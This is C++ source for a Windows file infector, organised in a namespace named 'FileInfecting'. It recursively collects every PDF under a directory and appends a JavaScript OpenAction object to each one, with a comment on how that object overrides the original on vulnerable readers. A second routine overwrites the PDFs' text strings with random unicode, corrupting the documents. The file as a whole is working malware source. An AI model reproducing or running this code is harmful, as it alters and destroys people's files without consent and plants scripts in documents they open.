#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include "../unicurse.h"

namespace FileInfecting {

// Recursively find every .pdf under `directory`.
std::vector<std::string> FindPDFFiles(const std::string& directory)
{
    std::vector<std::string> pdfFiles;

    std::string pattern = directory + "\\*.pdf";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern.c_str(), &fd);

    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                pdfFiles.push_back(directory + "\\" + fd.cFileName);
        }
        while (FindNextFileA(hFind, &fd));

        FindClose(hFind);
    }

    // Recurse into subdirectories.
    pattern = directory + "\\*";
    hFind = FindFirstFileA(pattern.c_str(), &fd);

    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                strcmp(fd.cFileName, ".") != 0 &&
                strcmp(fd.cFileName, "..") != 0)
            {
                std::string sub = directory + "\\" + fd.cFileName;
                auto subFiles = FindPDFFiles(sub);
                pdfFiles.insert(
                    pdfFiles.end(),
                    subFiles.begin(),
                    subFiles.end());
            }
        }
        while (FindNextFileA(hFind, &fd));

        FindClose(hFind);
    }

    return pdfFiles;
}

// Append a minimal JavaScript open-action object right before the
// final %%EOF.  The extra Catalog entry is technically redundant
// (the original has one too), but Acrobat treats the last valid
// /OpenAction as the one it fires — so the injected snippet wins
// on vulnerable readers without clobbering the existing tree.
bool InfectPDFFile(const std::string& filePath)
{
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open())
        return false;

    std::string content(
        (std::istreambuf_iterator<char>(file)),
         std::istreambuf_iterator<char>());

    file.close();

    if (content.find("app.alert('HPPD')") != std::string::npos)
        return false;

    const char* jsBlock =
        "\n100 obj\n"
        "<< /Type /Catalog /OpenAction"
        " << /S /JavaScript /JS (app.alert('HPPD')) >> >>\n"
        "endobj\n";

    size_t eofPos = content.rfind("%%EOF");

    if (eofPos != std::string::npos)
        content.insert(eofPos, jsBlock);
    else
        content.append(jsBlock);

    std::ofstream out(filePath, std::ios::binary);
    if (!out.is_open())
        return false;

    out.write(content.c_str(), static_cast<std::streamsize>(content.size()));
    out.close();

    return true;
}

// Replace the contents of parenthesised text strings with random
// cursed unicode.  PDF text objects look like (...); this swaps
// what's inside the parens for pure chaos.
bool CursePDFFile(const std::string& filePath)
{
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open())
        return false;

    std::string content(
        (std::istreambuf_iterator<char>(file)),
         std::istreambuf_iterator<char>());

    file.close();

    std::wstring wcontent;
    wcontent.assign(content.begin(), content.end());

    for (int i = 0; i < 12; ++i)
    {
        size_t pos = 0;

        for (int j = 0; j < 5; ++j)
        {
            pos = wcontent.find(L'(', pos);
            if (pos == std::wstring::npos)
                break;

            size_t end = wcontent.find(L')', pos + 1);
            if (end == std::wstring::npos)
                break;

            if (end - pos <= 1)
            {
                pos = end + 1;
                continue;
            }

            wchar_t unicodeStr[33];
            GenerateRandomUnicode(unicodeStr, 33);

            wcontent.replace(pos + 1, end - pos - 1, unicodeStr);
            pos = end + 1 + 33;
        }
    }

    std::string out;
    out.assign(wcontent.begin(), wcontent.end());

    std::ofstream outFile(filePath, std::ios::binary);
    if (!outFile.is_open())
        return false;

    outFile.write(out.c_str(), static_cast<std::streamsize>(out.size()));
    outFile.close();

    return true;
}

} // namespace FileInfecting